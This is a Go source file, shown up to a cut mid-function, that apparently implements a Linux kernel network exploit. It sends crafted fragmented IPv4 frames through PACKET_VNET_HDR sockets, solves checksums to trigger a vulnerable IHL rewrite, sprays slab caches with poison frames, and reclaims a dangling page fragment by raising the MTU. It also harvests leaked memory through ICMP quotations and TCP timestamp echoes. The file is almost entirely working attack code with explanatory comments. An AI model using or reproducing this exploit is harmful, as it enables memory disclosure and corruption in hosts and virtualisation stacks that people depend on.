package main

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"math/bits"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

const (
	solPacket      = 263
	packetVnetHdr  = 15
	soRcvbufForce  = 33
	ethPAll        = 0x0003
	ipProtoICMP    = 1
	ipProtoTCP     = 6
	ipProtoUDP     = 17
	ipProtoRaw     = 253
	mutatedIHL     = 60
	ethPArp        = 0x0806
	ethPExperiment = 0x88b5
	egressSprayLen = 128
	tcpEchoSrcPort = 0x8804
)

type egressRoute struct {
	iface   string
	dest    uint32
	gateway uint32
	mask    uint32
	prefix  int
}

type egressCaptureStats struct {
	txFragments     int
	icmpPackets     int
	quoted253       int
	quotedTCP       int
	quotedUDP       int
	matched         bool
	matchedPackets  int
	matchedIDs      map[uint16]struct{}
	returnedPackets int
	tcpEchoReplies  int
	arpRequests     int
	arpReplies      int
}

type egressPrepared struct {
	id      uint16
	payload []byte
}

func runStaleOptionsEgress(c cfg) error {
	ifi, err := net.InterfaceByName(c.iface)
	if err != nil {
		return fmt.Errorf("egress interface %s: %w", c.iface, err)
	}
	if len(ifi.HardwareAddr) != 6 {
		return fmt.Errorf("egress interface %s has unsupported MAC %s", c.iface, ifi.HardwareAddr)
	}
	src, err := egressSourceIP(ifi, c.src)
	if err != nil {
		return err
	}
	dst, err := egressResolveIPv4(c.dst)
	if err != nil {
		return err
	}
	nextHop, route, err := egressNextHop(c.iface, dst, c.gateway)
	if err != nil {
		return err
	}
	nextMAC, err := egressNextMAC(c.iface, src, dst, nextHop, c.dstMAC)
	if err != nil {
		return err
	}

	originalMTU := ifi.MTU
	if ipLen+40+8+8+c.egressRest <= originalMTU {
		return fmt.Errorf("stale egress datagram is too short to require host fragmentation at MTU %d", originalMTU)
	}
	maxChunk := ((originalMTU - ipLen - c.vlanTags*vlanLen) / 8) * 8
	if maxChunk < 8 {
		return fmt.Errorf("interface MTU %d is too small for %d-tag IPv4 fragments", originalMTU, c.vlanTags)
	}
	if err := setInterfaceMTU(c.iface, 65535); err != nil {
		return fmt.Errorf("raise %s MTU for jumbo descriptor seed: %w", c.iface, err)
	}
	defer func() {
		if err := setInterfaceMTU(c.iface, originalMTU); err != nil {
			fmt.Fprintf(os.Stderr, "warning: restore %s MTU %d: %v\n", c.iface, originalMTU, err)
		}
	}()

	tx, err := egressPacketSocket(ifi.Index, true)
	if err != nil {
		return fmt.Errorf("open PACKET_VNET_HDR tx socket: %w", err)
	}
	defer syscall.Close(tx)

	const desired = uint16(0x0045)
	id := uint16(ipID)
	headPayload := bytes.Repeat([]byte{0x31}, 8)
	shortPayload := bytes.Repeat([]byte{0x42}, 8)
	shortPayload[0] = 0x80
	shortPayload[1] = byte(c.staleOptSkip)
	shortPayload[c.staleOptSkip] = 0x44
	shortPayload[c.staleOptSkip+1] = byte(c.staleOptLen)
	finalPayload := bytes.Repeat([]byte{0x53}, c.egressRest)
	allPayload := append(append(append([]byte(nil), headPayload...), shortPayload...), finalPayload...)
	options := bytes.Repeat([]byte{1}, 40)
	whole := ipv4PacketWithOptionsFor(0, false, allPayload, id, options, src, dst, ipProtoRaw)
	forwardTTL(whole)
	adjust := len(whole) - len(finalPayload) + 32
	if !solvePacketChecksumAt(whole, adjust, desired) {
		return fmt.Errorf("stale egress: cannot solve deferred checksum word 0x%04x", desired)
	}
	copy(finalPayload[32:34], whole[adjust:adjust+2])

	shortIP := ipv4PacketWithOptionsFor(8, true, shortPayload, id, nil, src, dst, ipProtoRaw)
	shortFrame := egressFrame(shortIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
	shortFrame = stalePaddedGSOFrame(shortFrame, c.staleFragPadLen, 0x74)
	if err := egressSendVnetFrame(tx, ifi.Index, nextMAC, shortFrame, true, 0,
		uint16(c.staleFragHdrLen), 1400, uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
		return fmt.Errorf("send jumbo stale fragment: %w", err)
	}

	for offset := 0; offset < len(finalPayload); {
		n := min(maxChunk, len(finalPayload)-offset)
		more := offset+n < len(finalPayload)
		ip := ipv4PacketWithOptionsFor(16+offset, more, finalPayload[offset:offset+n], id, nil, src, dst, ipProtoRaw)
		frame := egressFrame(ip, ifi.HardwareAddr, nextMAC, c.vlanTags)
		if err := egressSendFrame(tx, ifi.Index, nextMAC, frame, true,
			uint16(l2LenForTags(c.vlanTags)+ipLen), 0); err != nil {
			return fmt.Errorf("send completing fragment offset=%d length=%d: %w", 16+offset, n, err)
		}
		offset += n
	}

	headIP := ipv4PacketWithOptionsFor(0, true, headPayload, id, options, src, dst, ipProtoRaw)
	headFrame := egressFrame(headIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
	if err := egressSendFrame(tx, ifi.Index, nextMAC, headFrame, true,
		uint16(l2LenForTags(c.vlanTags)), 0); err != nil {
		return fmt.Errorf("send malicious head fragment: %w", err)
	}
	if c.staleNaturalOverlap {
		// Give forwarding and packet-socket clones from the first datagram a
		// bounded window to release the poisoned page, then reclaim it with a
		// second live jumbo fragment. Ordinary untagged completion frames take
		// tun_build_skb and write through the dangling task_frag pointer.
		time.Sleep(c.staleDelay)
		overlapID := id + 1
		l2 := l2LenForTags(c.vlanTags)
		middlePayloadLen := c.staleFragPadLen - l2 - ipLen
		middlePayload := bytes.Repeat([]byte{0x72}, middlePayloadLen)
		middleIP := ipv4PacketWithOptionsFor(8, true, middlePayload, overlapID, nil, src, dst, ipProtoRaw)
		middleFrame := egressFrame(middleIP, ifi.HardwareAddr, nextMAC, c.vlanTags)
		if err := egressSendVnetFrame(tx, ifi.Index, nextMAC, middleFrame, false, 0,
			uint16(c.staleFragHdrLen), 1400, 0, 0); err != nil {
			return fmt.Errorf("send overlap reclaim fragment: %w", err)
		}
		overlapHeadIP := ipv4PacketWithOptionsFor(0, true, bytes.Repeat([]byte{0x68}, 8), overlapID, nil, src, dst, ipProtoRaw)
		overlapHead := egressFrameWithoutVLAN(overlapHeadIP, ifi.HardwareAddr, nextMAC)
		if err := egressSendFrame(tx, ifi.Index, nextMAC, overlapHead, false, 0, 0); err != nil {
			return fmt.Errorf("send overlap head fragment: %w", err)
		}
		overlapTailIP := ipv4PacketWithOptionsFor(8+middlePayloadLen, false, bytes.Repeat([]byte{0x7a}, 8), overlapID, nil, src, dst, ipProtoRaw)
		overlapTail := egressFrameWithoutVLAN(overlapTailIP, ifi.HardwareAddr, nextMAC)
		if err := egressSendFrame(tx, ifi.Index, nextMAC, overlapTail, false, 0, 0); err != nil {
			return fmt.Errorf("send overlap tail fragment: %w", err)
		}
		fmt.Printf("stale-egress: natural-overlap reclaim_id=0x%04x release_wait=%s padded=%d hdr_len=%d completion_l2=untagged\n",
			overlapID, c.staleDelay, len(middleFrame), c.staleFragHdrLen)
	}
	fmt.Printf("stale-egress: iface=%s original_mtu=%d jumbo_mtu=65535 src=%s dst=%s next_hop=%s next_mac=%s route=%s/%d vlan_tags=%d padded=%d hdr_len=%d final_payload=%d max_chunk=%d id=0x%04x\n",
		ifi.Name, originalMTU, src, dst, nextHop, nextMAC, routeIPv4(route.dest), route.prefix,
		c.vlanTags, c.staleFragPadLen, c.staleFragHdrLen, len(finalPayload), maxChunk, id)
	time.Sleep(c.egressWait)
	return nil
}

func runEgress(c cfg) error {
	ifi, err := net.InterfaceByName(c.iface)
	if err != nil {
		return fmt.Errorf("egress interface %s: %w", c.iface, err)
	}
	if len(ifi.HardwareAddr) != 6 {
		return fmt.Errorf("egress interface %s has unsupported MAC %s", c.iface, ifi.HardwareAddr)
	}
	src, err := egressSourceIP(ifi, c.src)
	if err != nil {
		return err
	}
	dst, err := egressResolveIPv4(c.dst)
	if err != nil {
		return err
	}
	nextHop, route, err := egressNextHop(c.iface, dst, c.gateway)
	if err != nil {
		return err
	}
	nextMAC, err := egressNextMAC(c.iface, src, dst, nextHop, c.dstMAC)
	if err != nil {
		return err
	}

	tx, err := egressPacketSocket(ifi.Index, true)
	if err != nil {
		return fmt.Errorf("open PACKET_VNET_HDR tx socket: %w", err)
	}
	defer syscall.Close(tx)
	rx, err := egressPacketSocket(ifi.Index, false)
	if err != nil {
		return fmt.Errorf("open capture socket: %w", err)
	}
	defer syscall.Close(rx)

	// VLAN headers live inside the raw frame, so keep each IPv4 fragment
	// below MTU by their full on-wire cost.
	maxChunk := ((ifi.MTU - ipLen - c.vlanTags*vlanLen) / 8) * 8
	if maxChunk < 8 {
		return fmt.Errorf("interface MTU %d is too small for %d-tag IPv4 fragments", ifi.MTU, c.vlanTags)
	}
	payloadLen := c.head + c.egressRest
	if c.tcpValid {
		payloadLen = egressTCPValidPayloadLen(src, dst, uint16(c.csumWord))
		if payloadLen < 60 {
			return fmt.Errorf("no TCP payload length can produce deferred checksum word 0x%04x", c.csumWord)
		}
	}
	payloadRest := payloadLen - c.head
	fragments := (payloadRest + maxChunk - 1) / maxChunk
	proto := byte(ipProtoRaw)
	switch c.transport {
	case "udp":
		proto = ipProtoUDP
	case "tcp":
		proto = ipProtoTCP
	}
	adjustIP := egressAdjustmentIPOffset(c.transport)
	if c.tcpValid {
		adjustIP = -1
	}
	tcpSrcPort := uint16(c.tcpSrcPort)
	if c.tcpEcho {
		tcpSrcPort = tcpEchoSrcPort
	}
	fmt.Printf("egress: iface=%s mtu=%d src=%s src_mac=%s dst=%s next_hop=%s next_mac=%s route=%s/%d transport=%s payload=%d fragments=%d+head spray=%d fill=0x%02x tcp_echo=%t\n",
		ifi.Name, ifi.MTU, src, ifi.HardwareAddr, dst, nextHop, nextMAC,
		routeIPv4(route.dest), route.prefix, c.transport, payloadLen, fragments,
		c.egressSpray, c.egressFill, c.tcpEcho)

	samples := make([]egressPrepared, 0, c.count)
	expected := make(map[uint16]struct{}, c.count)
	for sample := 0; sample < c.count; sample++ {
		id := uint16(ipID + sample)
		payload := make([]byte, payloadLen)
		for i := range payload {
			payload[i] = 0x11
		}
		switch c.transport {
		case "udp":
			egressUDPHeaders(payload, uint16(c.udpSrcPort), uint16(c.udpPort))
		case "tcp":
			egressTCPHeaders(payload, tcpSrcPort, uint16(c.tcpPort))
			if c.tcpEcho {
				egressTCPEchoOptions(payload)
			}
		default:
			for i := 0; i < c.head; i++ {
				payload[i] = marker
			}
		}
		if c.tcpValid {
			egressTCPChecksums(payload, src, dst)
			pkt := egressFragment(0, false, payload, id, src, dst, proto)
			forwardTTL(pkt)
			if got := csumFold(csumPartial(pkt)); got != uint16(c.csumWord) {
				return fmt.Errorf("sample %d: valid TCP geometry produced checksum word 0x%04x, want 0x%04x", sample, got, c.csumWord)
			}
		} else if !egressSolveAt(payload, id, src, dst, proto, c.csumOffset, uint16(c.csumWord), adjustIP) {
			return fmt.Errorf("sample %d: solver found no adjustment for checksum word 0x%04x", sample, c.csumWord)
		}
		samples = append(samples, egressPrepared{id: id, payload: payload})
		expected[id] = struct{}{}
	}
	for sample, prepared := range samples {
		if err := egressSendSequence(tx, ifi, ifi.HardwareAddr, nextMAC, src, dst, prepared.id, proto, prepared.payload, c.head, maxChunk, c.csumOffset, adjustIP, c.vlanTags, c.egressSpray, c.egressFill, c.sprayDelay); err != nil {
			return fmt.Errorf("sample %d: %w", sample, err)
		}
	}
	stats, err := egressCollectICMP(rx, tx, ifi, c.egressWait, expected, src, dst, proto, c.head, c.answerDstARP, c.tcpEcho, tcpSrcPort, uint16(c.tcpPort))
	if err != nil {
		return fmt.Errorf("capture: %w", err)
	}
	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d tcp_echo_replies=%d arp_requests=%d arp_replies=%d icmp=%d quoted_tcp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
		len(samples), stats.txFragments, stats.returnedPackets, stats.tcpEchoReplies, stats.arpRequests, stats.arpReplies,
		stats.icmpPackets, stats.quotedTCP, stats.quotedUDP, stats.quoted253,
		stats.matchedPackets, len(stats.matchedIDs))
	if !stats.matched {
		return errors.New("no matching returned fragment or ICMP quotation received; use -answer-dst-arp with an unused host-TAP address or capture at a controlled endpoint")
	}
	return nil
}

func egressUDPHeaders(payload []byte, srcPort, dstPort uint16) {
	// Before the checksum write, conntrack sees this ordinary UDP header at
	// payload offset zero. A zero IPv4 UDP checksum is valid.
	putUDPHeader(payload[:8], srcPort, dstPort, uint16(len(payload)))
	if len(payload) < 48 {
		// A deliberately short reassembly cannot carry the duplicate header.
		// This geometry is useful only in a disposable bridge-fragment lab:
		// after IHL grows to 60, the datagram is shorter than its new header.
		return
	}
	// After IHL changes from 20 to 60, fragmentation skips 40 bytes of the
	// original payload. This duplicate becomes the UDP header on the wire.
	putUDPHeader(payload[40:48], srcPort, dstPort, uint16(len(payload)-40))
}

func putUDPHeader(dst []byte, srcPort, dstPort, length uint16) {
	binary.BigEndian.PutUint16(dst[0:2], srcPort)
	binary.BigEndian.PutUint16(dst[2:4], dstPort)
	binary.BigEndian.PutUint16(dst[4:6], length)
	binary.BigEndian.PutUint16(dst[6:8], 0)
}

func egressTCPHeaders(payload []byte, srcPort, dstPort uint16) {
	// The first SYN-shaped header is visible to host policy before the IHL
	// mutation. After IHL grows from 20 to 60, the second header becomes the
	// transport header observed on the emitted fragments.
	putTCPHeader(payload[:20], srcPort, dstPort)
	putTCPHeader(payload[40:60], srcPort, dstPort)
}

// egressTCPEchoOptions makes the original TCP header double as a valid
// 40-byte IPv4 option area after the vulnerable IHL rewrite. Source port
// 0x8804 is a copied four-byte Stream-ID option; it safely consumes the
// destination port. The sequence bytes then describe a 36-byte Timestamp
// option whose pointer is one byte beyond the option, so a peer copies it into
// a reply without replacing any disclosed bytes. The same sequence is used in
// the post-mutation TCP header to keep conntrack state consistent.
func egressTCPEchoOptions(payload []byte) {
	if len(payload) < 60 {
		return
	}
	payload[4] = 0x44 // IPOPT_TIMESTAMP
	payload[5] = 36
	payload[6] = 37 // no free route slot
	payload[7] = 0  // TSONLY; routers may increment only the overflow nibble
	copy(payload[44:48], payload[4:8])
}

func putTCPHeader(dst []byte, srcPort, dstPort uint16) {
	clear(dst[:20])
	binary.BigEndian.PutUint16(dst[0:2], srcPort)
	binary.BigEndian.PutUint16(dst[2:4], dstPort)
	binary.BigEndian.PutUint32(dst[4:8], 0x50574e31) // "PWN1"
	dst[12] = 5 << 4                                 // 20-byte TCP header
	dst[13] = 0x02                                   // SYN
	binary.BigEndian.PutUint16(dst[14:16], 64240)
	// A passive AF_PACKET collector sees the fragments before the remote TCP
	// stack validates this zero checksum. The malformed checksum is deliberate:
	// making it valid would constrain the same sum used for the vulnerable
	// deferred IPv4-header write.
}

func egressTCPChecksums(payload []byte, src, dst net.IP) {
	// The post-mutation checksum is part of the pre-mutation TCP payload, so
	// complete it first and then checksum the full original segment.
	binary.BigEndian.PutUint16(payload[56:58], 0)
	binary.BigEndian.PutUint16(payload[56:58], tcpIPv4Checksum(src, dst, payload[40:]))
	binary.BigEndian.PutUint16(payload[16:18], 0)
	binary.BigEndian.PutUint16(payload[16:18], tcpIPv4Checksum(src, dst, payload))
}

func tcpIPv4Checksum(src, dst net.IP, segment []byte) uint16 {
	var sum uint32
	add := func(data []byte) {
		for len(data) >= 2 {
			sum += uint32(binary.BigEndian.Uint16(data[:2]))
			data = data[2:]
		}
		if len(data) == 1 {
			sum += uint32(data[0]) << 8
		}
	}
	add(src.To4())
	add(dst.To4())
	sum += ipProtoTCP
	sum += uint32(len(segment))
	add(segment)
	for sum > 0xffff {
		sum = (sum & 0xffff) + (sum >> 16)
	}
	return ^uint16(sum)
}

func egressTCPValidPayloadLen(src, dst net.IP, desired uint16) int {
	// A valid IPv4 header sums to 0xffff. A checksum-valid TCP segment's
	// folded sum is the complement of its pseudo-header sum. Consequently,
	// skb_checksum_help's host-endian result over IPv4+TCP is the byte-swapped
	// folded pseudo-header sum. TCP length is therefore a free 16-bit solver.
	for length := 60; length <= 65515; length++ {
		var sum uint32
		for _, ip := range []net.IP{src.To4(), dst.To4()} {
			sum += uint32(binary.BigEndian.Uint16(ip[0:2]))
			sum += uint32(binary.BigEndian.Uint16(ip[2:4]))
		}
		sum += ipProtoTCP
		sum += uint32(length)
		for sum > 0xffff {
			sum = (sum & 0xffff) + (sum >> 16)
		}
		if bits.ReverseBytes16(uint16(sum)) == desired {
			return length
		}
	}
	return 0
}

func egressAdjustmentIPOffset(transport string) int {
	if transport == "tcp" {
		// Payload bytes 0..19 and 40..59 are the two TCP headers. Payload
		// bytes 24..25 are outside both, at full IPv4 offsets 44..45.
		return 44
	}
	return 32
}

func egressSourceIP(ifi *net.Interface, override string) (net.IP, error) {
	if override != "" {
		ip := net.ParseIP(override).To4()
		if ip == nil {
			return nil, fmt.Errorf("invalid -src IPv4 address %q", override)
		}
		return ip, nil
	}
	addrs, err := ifi.Addrs()
	if err != nil {
		return nil, fmt.Errorf("list %s addresses: %w", ifi.Name, err)
	}
	for _, addr := range addrs {
		ip, _, err := net.ParseCIDR(addr.String())
		if err == nil && ip.To4() != nil {
			return ip.To4(), nil
		}
	}
	return nil, fmt.Errorf("interface %s has no IPv4 address", ifi.Name)
}

func egressResolveIPv4(name string) (net.IP, error) {
	if ip := net.ParseIP(name).To4(); ip != nil {
		return ip, nil
	}
	ips, err := net.LookupIP(name)
	if err != nil {
		return nil, fmt.Errorf("resolve %s: %w", name, err)
	}
	for _, ip := range ips {
		if ip4 := ip.To4(); ip4 != nil {
			return ip4, nil
		}
	}
	return nil, fmt.Errorf("%s has no IPv4 address", name)
}

func egressNextHop(iface string, dst net.IP, override string) (net.IP, egressRoute, error) {
	if override != "" {
		ip := net.ParseIP(override).To4()
		if ip == nil {
			return nil, egressRoute{}, fmt.Errorf("invalid -gateway IPv4 address %q", override)
		}
		return ip, egressRoute{iface: iface}, nil
	}
	routes, err := egressRoutes()
	if err != nil {
		return nil, egressRoute{}, err
	}
	d := routeUint(dst)
	best := egressRoute{prefix: -1}
	for _, route := range routes {
		if route.iface == iface && d&route.mask == route.dest&route.mask && route.prefix > best.prefix {
			best = route
		}
	}
	if best.prefix < 0 {
		return nil, egressRoute{}, fmt.Errorf("no route to %s through %s", dst, iface)
	}
	if best.gateway == 0 {
		return dst, best, nil
	}
	return routeIPv4(best.gateway), best, nil
}

func egressRoutes() ([]egressRoute, error) {
	f, err := os.Open("/proc/net/route")
	if err != nil {
		return nil, fmt.Errorf("read routes: %w", err)
	}
	defer f.Close()
	var out []egressRoute
	s := bufio.NewScanner(f)
	for s.Scan() {
		fields := strings.Fields(s.Text())
		if len(fields) < 8 || fields[0] == "Iface" {
			continue
		}
		dest, e1 := strconv.ParseUint(fields[1], 16, 32)
		gateway, e2 := strconv.ParseUint(fields[2], 16, 32)
		flags, e3 := strconv.ParseUint(fields[3], 16, 32)
		mask, e4 := strconv.ParseUint(fields[7], 16, 32)
		if e1 != nil || e2 != nil || e3 != nil || e4 != nil || flags&1 == 0 {
			continue
		}
		out = append(out, egressRoute{
			iface: fields[0], dest: uint32(dest), gateway: uint32(gateway), mask: uint32(mask),
			prefix: bits.OnesCount32(uint32(mask)),
		})
	}
	if err := s.Err(); err != nil {
		return nil, fmt.Errorf("scan routes: %w", err)
	}
	return out, nil
}

func egressNextMAC(iface string, src, dst, nextHop net.IP, override string) (net.HardwareAddr, error) {
	if override != "" {
		mac, err := net.ParseMAC(override)
		if err != nil || len(mac) != 6 {
			return nil, fmt.Errorf("invalid -dst-mac %q", override)
		}
		return mac, nil
	}
	if mac := egressARP(iface, nextHop); mac != nil {
		return mac, nil
	}
	conn, err := net.DialUDP("udp4", &net.UDPAddr{IP: src}, &net.UDPAddr{IP: dst, Port: 9})
	if err == nil {
		_, _ = conn.Write([]byte{0})
		_ = conn.Close()
	}
	for i := 0; i < 20; i++ {
		if mac := egressARP(iface, nextHop); mac != nil {
			return mac, nil
		}
		time.Sleep(50 * time.Millisecond)
	}
	return nil, fmt.Errorf("no ARP entry for next hop %s on %s; supply -dst-mac", nextHop, iface)
}

func egressARP(iface string, ip net.IP) net.HardwareAddr {
	f, err := os.Open("/proc/net/arp")
	if err != nil {
		return nil
	}
	defer f.Close()
	s := bufio.NewScanner(f)
	for s.Scan() {
		fields := strings.Fields(s.Text())
		if len(fields) < 6 || fields[0] != ip.String() || fields[5] != iface {
			continue
		}
		flags, _ := strconv.ParseUint(strings.TrimPrefix(fields[2], "0x"), 16, 32)
		mac, err := net.ParseMAC(fields[3])
		if err == nil && len(mac) == 6 && flags&2 != 0 {
			return mac
		}
	}
	return nil
}

func egressPacketSocket(ifindex int, vnet bool) (int, error) {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(ethPAll)))
	if err != nil {
		return -1, err
	}
	if vnet {
		if err := syscall.SetsockoptInt(fd, solPacket, packetVnetHdr, 1); err != nil {
			syscall.Close(fd)
			return -1, err
		}
	}
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{Protocol: htons(ethPAll), Ifindex: ifindex}); err != nil {
		syscall.Close(fd)
		return -1, err
	}
	if !vnet {
		// Batch mode can queue hundreds of outgoing observations and ICMP
		// quotations before collection starts. Root in the guest normally has
		// CAP_NET_ADMIN, so request a large buffer without depending on rmem_max.
		if err := syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, soRcvbufForce, 32<<20); err != nil {
			_ = syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF, 4<<20)
		}
		_ = syscall.SetsockoptTimeval(fd, syscall.SOL_SOCKET, syscall.SO_RCVTIMEO, &syscall.Timeval{Usec: 10000})
	}
	return fd, nil
}

func egressSendSequence(fd int, ifi *net.Interface, srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP, id uint16, proto byte, payload []byte, head, maxChunk, csumOffset, adjustIP, vlanTags, spray int, sprayFill byte, sprayDelay time.Duration) error {
	for offset := head; offset < len(payload); {
		n := min(maxChunk, len(payload)-offset)
		more := offset+n < len(payload)
		ip := egressFragment(offset, more, payload[offset:offset+n], id, srcIP, dstIP, proto)
		if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(ip, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)+ipLen), 0); err != nil {
			return fmt.Errorf("send fragment offset=%d length=%d: %w", offset, n, err)
		}
		offset += n
	}
	if spray > 0 {
		poison := egressSprayFrame(srcMAC, dstMAC, sprayFill)
		for i := 0; i < spray; i++ {
			if err := egressSendFrame(fd, ifi.Index, dstMAC, poison, false, 0, 0); err != nil {
				return fmt.Errorf("send predecessor spray %d/%d: %w", i+1, spray, err)
			}
		}
		if sprayDelay > 0 {
			time.Sleep(sprayDelay)
		}
	}
	first := egressFragment(0, true, payload[:head], id, srcIP, dstIP, proto)
	if err := egressSendFrame(fd, ifi.Index, dstMAC, egressFrame(first, srcMAC, dstMAC, vlanTags), true, uint16(l2LenForTags(vlanTags)), uint16(csumOffset)); err != nil {
		return fmt.Errorf("send head fragment: %w", err)
	}
	if adjustIP >= ipLen {
		adjustPayload := adjustIP - ipLen
		fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment_ip_offset=%d adjustment=%02x%02x\n",
			id, head, len(payload)-head, adjustIP, payload[adjustPayload], payload[adjustPayload+1])
	} else {
		fmt.Printf("sent: id=0x%04x head=%d rest=%d adjustment=dual-valid-tcp-checksums\n",
			id, head, len(payload)-head)
	}
	return nil
}

// egressSprayFrame creates a short, non-IP frame that the host TAP copies into
// the same dedicated small-head cache used by the malicious 50-byte frame. An
// unhandled experimental EtherType makes the frame eligible for an immediate
// synchronous drop; if SLUB reuses that object for the following head, bytes
// beyond the head's logical tail retain sprayFill and become visible in the
// IHL-expansion disclosure.
func egressSprayFrame(src, dst net.HardwareAddr, fill byte) []byte {
	frame := bytesRepeat(egressSprayLen, fill)
	copy(frame[0:6], dst)
	copy(frame[6:12], src)
	binary.BigEndian.PutUint16(frame[12:14], ethPExperiment)
	return frame
}

func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, checksum bool, start, offset uint16) error {
	buf := make([]byte, 10+len(frame))
	if checksum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
		binary.LittleEndian.PutUint16(buf[8:], offset)
	}
	copy(buf[10:], frame)
	protocol := uint16(ethPAll)
	if len(frame) >= ethLen {
		protocol = binary.BigEndian.Uint16(frame[12:14])
	}
	addr := &syscall.SockaddrLinklayer{Protocol: htons(protocol), Ifindex: ifindex, Halen: 6}
	copy(addr.Addr[:], dstMAC)
	return syscall.Sendto(fd, buf, 0, addr)
}

func egressSendVnetFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, checksum bool, gsoType byte, hdrLen, gsoSize, start, offset uint16) error {
	buf := make([]byte, 10+len(frame))
	if checksum {
		buf[0] = needsCsum
		binary.LittleEndian.PutUint16(buf[6:], start)
		binary.LittleEndian.PutUint16(buf[8:], offset)
	}
	buf[1] = gsoType
	binary.LittleEndian.PutUint16(buf[2:], hdrLen)
	binary.LittleEndian.PutUint16(buf[4:], gsoSize)
	copy(buf[10:], frame)
	protocol := uint16(ethPAll)
	if len(frame) >= ethLen {
		protocol = binary.BigEndian.Uint16(frame[12:14])
	}
	addr := &syscall.SockaddrLinklayer{Protocol: htons(protocol), Ifindex: ifindex, Halen: 6}
	copy(addr.Addr[:], dstMAC)
	return syscall.Sendto(fd, buf, 0, addr)
}

func setInterfaceMTU(name string, mtu int) error {
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_DGRAM, 0)
	if err != nil {
		return err
	}
	defer syscall.Close(fd)
	var req [40]byte
	copy(req[:16], name)
	*(*int32)(unsafe.Pointer(&req[16])) = int32(mtu)
	_, _, errno := syscall.Syscall(syscall.SYS_IOCTL, uintptr(fd), uintptr(0x8922), uintptr(unsafe.Pointer(&req[0])))
	if errno != 0 {
		return errno
	}
	return nil
}

func egressSolve(payload []byte, id uint16, src, dst net.IP, proto byte, csumOffset int, desired uint16) bool {
	return egressSolveAt(payload, id, src, dst, proto, csumOffset, desired, 32)
}

func egressSolveAt(payload []byte, id uint16, src, dst net.IP, proto byte, csumOffset int, desired uint16, adjustIP int) bool {
	if adjustIP < ipLen || adjustIP+1 >= ipLen+len(payload) {
		return false
	}
	off := adjustIP - ipLen
	for word := 0; word < 65536; word++ {
		payload[off] = byte(word)
		payload[off+1] = byte(word >> 8)
		pkt := egressFragment(0, false, payload, id, src, dst, proto)
		forwardTTL(pkt)
		if csumFold(csumPartial(pkt)) == desired {
			return true
		}
	}
	return false
}

func egressFragment(offset int, more bool, payload []byte, id uint16, src, dst net.IP, protoOpt ...byte) []byte {
	proto := byte(ipProtoRaw)
	if len(protoOpt) > 0 {
		proto = protoOpt[0]
	}
	pkt := make([]byte, ipLen+len(payload))
	pkt[0] = 0x45
	binary.BigEndian.PutUint16(pkt[2:], uint16(len(pkt)))
	binary.BigEndian.PutUint16(pkt[4:], id)
	frag := uint16(offset / 8)
	if more {
		frag |= 0x2000
	}
	binary.BigEndian.PutUint16(pkt[6:], frag)
	pkt[8] = 64
	pkt[9] = proto
	copy(pkt[12:16], src.To4())
	copy(pkt[16:20], dst.To4())
	copy(pkt[ipLen:], payload)
	binary.BigEndian.PutUint16(pkt[10:], ipChecksum(pkt[:ipLen]))
	return pkt
}

func egressFrame(ip []byte, src, dst net.HardwareAddr, tags int) []byte {
	l2 := l2LenForTags(tags)
	f := make([]byte, l2+len(ip))
	copy(f[0:6], dst)
	copy(f[6:12], src)
	binary.BigEndian.PutUint16(f[12:], vlanProto)
	off := ethLen
	for i := 0; i < tags; i++ {
		binary.BigEndian.PutUint16(f[off:], 0)
		proto := uint16(vlanProto)
		if i == tags-1 {
			proto = ipProtoEth
		}
		binary.BigEndian.PutUint16(f[off+2:], proto)
		off += vlanLen
	}
	copy(f[l2:], ip)
	return f
}

func egressFrameWithoutVLAN(ip []byte, src, dst net.HardwareAddr) []byte {
	f := make([]byte, ethLen+len(ip))
	copy(f[0:6], dst)
	copy(f[6:12], src)
	binary.BigEndian.PutUint16(f[12:], ipProtoEth)
	copy(f[ethLen:], ip)
	return f
}

func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, expected map[uint16]struct{}, src, dst net.IP, proto byte, head int, answerDstARP, tcpEcho bool, tcpSrcPort, tcpDstPort uint16) (egressCaptureStats, error) {
	deadline := time.Now().Add(wait)
	buf := make([]byte, 65536)
	stats := egressCaptureStats{matchedIDs: make(map[uint16]struct{})}
	for time.Now().Before(deadline) {
		n, _, err := syscall.Recvfrom(fd, buf, 0)
		if err != nil {
			if errors.Is(err, syscall.EAGAIN) || errors.Is(err, syscall.EWOULDBLOCK) || errors.Is(err, syscall.EINTR) {
				continue
			}
			return stats, err
		}
		frame := buf[:n]
		if answerDstARP {
			requesterMAC, requesterIP, ok := egressARPRequest(frame, dst)
			if ok {
				stats.arpRequests++
				reply := egressARPReply(ifi.HardwareAddr, requesterMAC, dst, requesterIP)
				if err := egressSendFrame(txfd, ifi.Index, requesterMAC, reply, false, 0, 0); err != nil {
					return stats, fmt.Errorf("answer ARP for %s: %w", dst, err)
				}
				stats.arpReplies++
				fmt.Printf("arp-reply: claimed=%s requester=%s requester_mac=%s\n", dst, requesterIP, requesterMAC)
			}
		}
		outer := ipv4Of(frame)
		if len(outer) < ipLen {
			continue
		}
		outerID := binary.BigEndian.Uint16(outer[4:])
		_, expectedID := expected[outerID]
		fromLocalMAC := len(frame) >= ethLen && bytes.Equal(frame[6:12], ifi.HardwareAddr)
		if fromLocalMAC && outer[9] == proto {
			if expectedID {
				stats.txFragments++
			}
		}
		toLocalMAC := len(frame) >= ethLen && bytes.Equal(frame[0:6], ifi.HardwareAddr) && !bytes.Equal(frame[6:12], ifi.HardwareAddr)
